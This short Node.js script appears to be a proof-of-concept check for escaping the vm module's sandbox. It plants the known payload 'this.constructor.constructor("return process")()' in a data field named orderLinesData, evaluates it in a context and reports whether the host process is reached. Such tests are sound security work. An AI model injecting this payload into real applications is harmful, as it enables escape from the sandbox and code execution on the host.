const vm = require('vm');
const sandbox = Object.create(null);
sandbox.orderLinesData = 'this.constructor.constructor("return process")()';
vm.createContext(sandbox);
try {
  let res = vm.runInContext('eval(orderLinesData)', sandbox, { timeout: 2000 });
  console.log('Vulnerable?', res.version);
} catch (e) {
  console.log('Error:', e.message);
}
